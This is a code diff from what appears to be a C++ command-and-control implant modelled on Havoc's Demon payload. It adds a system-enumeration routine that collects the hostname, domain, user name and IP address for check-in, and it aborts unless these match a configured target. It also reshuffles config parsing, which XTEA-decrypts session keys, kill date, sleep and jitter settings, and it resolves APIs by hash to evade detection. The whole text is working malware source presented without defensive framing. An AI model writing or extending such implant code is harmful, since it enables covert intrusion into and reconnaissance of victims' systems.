@@ -44,24 +44,20 @@ namespace Main {
         ContextDestroy();
     }
 
+	BOOL EnumSystem() {
+		// resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
+		HEXANE;
+		
+		_stream *out              = CreateStreamWithHeaders(TypeCheckin);
+        IP_ADAPTER_INFO adapter   = { };
+		OSVERSIONINFOW os_version = { };
 
-    BOOL ResolveApi() {
-        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
-        HEXANE;
-
-        bool success = true;
-        OSVERSIONINFOW os_version = { };
-
-		// TODO: separate this in a different API.
-		// create an enumeration module for a stager.
-		// separate api's into groups for minimal win32 loading process
-		// (stager/enumeration/opsec) -> (second stage payload)
-        x_assertb(Ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
-        x_assertb(Ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
-
-        x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));
+		BOOL success             = true;
+        DWORD length             = MAX_PATH;
+        CHAR buffer[MAX_PATH]    = { };
+        
         x_ntassertb(Ctx->nt.RtlGetVersion(&os_version));
-
+		
         Ctx->Session.Version = WIN_VERSION_UNKNOWN;
         os_version.dwOSVersionInfoSize = sizeof(os_version);
 		
@@ -91,6 +87,70 @@ namespace Main {
                 }
             }
         }
+
+        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
+            if (Ctx->config.hostname[0]) {
+                if (MbsBoundCompare(buffer, Ctx->config.hostname, MbsLength(Ctx->config.hostname)) != 0) {
+                    return false;
+                }
+            }
+            PackString(out, buffer);
+        }
+        else {
+            PackUint32(out, 0);
+        }
+
+        MemSet(buffer, 0, MAX_PATH);
+        length = MAX_PATH;
+
+        if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
+            if (Ctx->transport.domain[0]) {
+                if (MbsBoundCompare(Ctx->transport.domain, buffer, MbsLength(Ctx->transport.domain)) != 0) {
+                    return false;
+                }
+            }
+            PackString(out, buffer);
+        }
+        else {
+            PackUint32(out, 0);
+        }
+
+        MemSet(buffer, 0, MAX_PATH);
+        length = MAX_PATH;
+
+        if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
+            PackString(out, buffer);
+        }
+        else {
+            PackUint32(out, 0);
+        }
+
+        MemSet(buffer, 0, MAX_PATH);
+        length = sizeof(IP_ADAPTER_INFO);
+
+        if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
+            PackString(out, adapter.IpAddressList.IpAddress.String);
+        }
+        else {
+            PackUint32(out, 0);
+        }
+
+        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
+
+    defer:
+        Dispatcher::MessageQueue(out);
+        return success;
+    }
+
+    BOOL ResolveApi() {
+		// TODO: create separate ResolveApi for loader and payload
+		HEXANE;
+
+        bool success = true;
+        x_assertb(Ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
+        x_assertb(Ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
+
+        x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));
 
         x_assertb(F_PTR_HMOD(Ctx->nt.NtDelayExecution,              Ctx->modules.ntdll, NTDELAYEXECUTION));
         x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateEvent,                 Ctx->modules.ntdll, NTCREATEEVENT));
@@ -145,49 +205,7 @@ namespace Main {
         x_assertb(F_PTR_HMOD(Ctx->nt.RtlGetVersion,                 Ctx->modules.ntdll, RTLGETVERSION));
         x_assertb(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation,      Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));
 
-        defer:
-        return success;
-    }
-
-    BOOL ReadConfig() {
-        HEXANE;
-
-        _parser parser  = { };
-        bool success    = true;
-
-        CreateParser(&parser, Config, sizeof(Config));
-        MemSet(Config, 0, sizeof(Config));
-
-        Ctx->session.peer_id = UnpackUint32(&parser);
-        ParserMemcpy(&parser, &Ctx->config.session_key, nullptr);
-
-        if (ENCRYPTED) {
-            XteaCrypt(B_PTR(parser.buffer), parser.Length, Ctx->config.session_key, false);
-        }
-
-        ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
-
-        Ctx->session.retries        = UnpackUint32(&parser);
-        Ctx->config.working_hours   = UnpackUint32(&parser);
-        Ctx->config.kill_date       = UnpackUint64(&parser);
-        Ctx->config.sleeptime       = UnpackUint32(&parser);
-        Ctx->config.jitter          = UnpackUint32(&parser);
-
-        // TODO: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
-
-        if (F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA)) {
-            x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
-            x_assertb(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
-        }
-        else {
-            success = false;
-            goto defer;
-        }
-
-        x_assertb(F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
+		x_assertb(F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
         x_assertb(F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY));
         x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST));
         x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListNext,                  Ctx->modules.kernel32, HEAP32LISTNEXT));
@@ -276,7 +294,50 @@ namespace Main {
         x_assertb(F_PTR_HMOD(Ctx->win32.InitializeAcl,                   Ctx->modules.advapi, INITIALIZEACL));
         x_assertb(F_PTR_HMOD(Ctx->win32.FreeSid,                         Ctx->modules.advapi, FREESID));
 
+        defer:
+        return success;
+    }
+
+    BOOL ReadConfig() {
+        HEXANE;
+
+        _parser parser  = { };
+        bool success    = true;
+
+        CreateParser(&parser, Config, sizeof(Config));
+        MemSet(Config, 0, sizeof(Config));
+
+        Ctx->session.peer_id = UnpackUint32(&parser);
+        ParserMemcpy(&parser, &Ctx->config.session_key, nullptr);
+
+        if (ENCRYPTED) {
+            XteaCrypt(B_PTR(parser.buffer), parser.Length, Ctx->config.session_key, false);
+        }
+
+        ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
+
+        Ctx->session.retries        = UnpackUint32(&parser);
+        Ctx->config.working_hours   = UnpackUint32(&parser);
+        Ctx->config.kill_date       = UnpackUint64(&parser);
+        Ctx->config.sleeptime       = UnpackUint32(&parser);
+        Ctx->config.jitter          = UnpackUint32(&parser);
+
+        // TODO: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
+
+        if (F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA)) {
+            x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+            x_assertb(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
+        }
+        else {
+            success = false;
+            goto defer;
+        }
+
         Ctx->transport.message_queue = nullptr;
+		
 #ifdef TRANSPORT_HTTP
         Ctx->transport.http = (_http_context*) Malloc(sizeof(_http_context));
 
